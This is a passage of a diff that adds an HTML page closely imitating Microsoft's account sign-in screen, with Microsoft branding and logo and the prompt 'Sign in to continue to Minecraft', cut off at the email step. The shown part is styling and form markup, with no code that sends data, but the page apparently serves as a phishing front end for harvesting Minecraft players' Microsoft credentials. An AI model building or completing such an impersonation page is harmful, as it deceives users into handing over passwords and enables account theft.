@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in to your Microsoft account</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;
+ background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column;align-items:center;
+ justify-content:center;color:#1b1b1b;padding:24px}
+.card{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);
+ border-radius:2px;position:relative}
+.brand{display:flex;align-items:center;gap:9px;margin-bottom:18px;font-size:15px;color:#5e5e5e}
+.brand svg{width:20px;height:20px}
+h1{font-size:24px;font-weight:600;letter-spacing:-.3px;margin-bottom:14px}
+.sub{font-size:15px;margin-bottom:18px}
+.sub b{font-weight:600}
+input{width:100%;height:36px;border:1px solid #666;border-radius:0;padding:0 8px;
+ font-size:15px;font-family:inherit;outline:none;margin-bottom:4px;background:#fff}
+input:focus{border-color:#0067b8;box-shadow:inset 0 0 0 1px #0067b8}
+.err{color:#e81123;font-size:13px;min-height:18px;margin-bottom:6px}
+.link{color:#0067b8;font-size:13px;text-decoration:none;display:inline-block;margin-bottom:18px}
+.link:hover{text-decoration:underline;color:#004578}
+.actions{display:flex;justify-content:flex-end;margin-top:8px}
+.btn{background:#0067b8;color:#fff;border:0;padding:0 24px;height:32px;font-size:15px;
+ font-family:inherit;cursor:pointer;min-width:108px;border-radius:2px}
+.btn:hover{background:#005da6}
+.btn:active{background:#004578}
+.back{position:absolute;top:52px;left:14px;background:none;border:0;cursor:pointer;
+ font-size:20px;color:#0067b8;line-height:1;padding:4px 8px}
+.back:hover{color:#004578}
+.with-back{padding-left:26px}
+.foot{margin-top:26px;display:flex;justify-content:flex-end;gap:18px;
+ font-size:12px;color:#5e5e5e;width:100%;max-width:440px}
+.foot a{color:#5e5e5e;text-decoration:none}
+.foot a:hover{text-decoration:underline}
+.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.4);
+ border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:480px){.card{padding:32px 24px;box-shadow:none;background:#fff;max-width:none}
+ body{padding:0;background:#fff;justify-content:flex-start}.foot{padding:24px}}
+</style>
+</head>
+<body>
+
+<div class="brand">
+  <svg viewBox="0 0 23 23"><rect x="1" y="1" width="10" height="10" fill="#f25022"/><rect x="12" y="1" width="10" height="10" fill="#7fba00"/><rect x="1" y="12" width="10" height="10" fill="#00a4ef"/><rect x="12" y="12" width="10" height="10" fill="#ffb900"/></svg>
+  Microsoft
+</div>
+
+<div class="card">
+
+  <!-- STEP 1: email -->
+  <div id="step1">
+    <h1>Sign in</h1>
+    <p class="sub">to continue to <b>Minecraft</b></p>
+    <input id="email" type="email" placeholder="Email, phone, or Skype"
+           autocomplete="username" spellcheck="false">
+    <p class="err" id="e1"></p>
+    <a class="link" href="#">No account? Create one!</
